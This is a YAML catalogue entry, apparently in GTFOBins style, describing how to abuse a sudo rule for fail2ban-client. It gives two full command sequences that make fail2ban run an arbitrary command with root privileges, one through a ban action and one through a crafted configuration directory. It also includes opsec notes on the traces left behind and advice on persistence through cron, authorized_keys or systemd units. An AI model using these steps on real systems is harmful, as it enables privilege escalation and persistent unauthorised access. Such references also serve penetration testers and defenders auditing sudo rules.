---
name: fail2ban-client
capabilities:
- exec
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    fail2ban-client add x
    fail2ban-client set x addaction x
    fail2ban-client set x action x actionban /path/to/command
    fail2ban-client start x
    fail2ban-client set x banip 999.999.999.999
    fail2ban-client set x unbanip 999.999.999.999
    fail2ban-client stop x
  notes: The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.
- id: command-2
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    cat >/path/to/temp-dir/fail2ban.conf <<EOF
    [Definition]
    EOF

    cat >/path/to/temp-dir/jail.local <<EOF
    [x]
    enabled = true
    action = x
    EOF

    mkdir -p /path/to/temp-dir/action.d/
    cat >/path/to/temp-dir/action.d/x.conf <<EOF
    [Definition]
    actionstart = /path/to/command
    EOF

    mkdir -p /path/to/temp-dir/filter.d/
    cat >/path/to/temp-dir/filter.d/x.conf <<EOF
    [Definition]
    EOF

    fail2ban-client -c /path/to/temp-dir/ -v restart
references:
- https://gtfobins.github.io/gtfobins/fail2ban-client/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
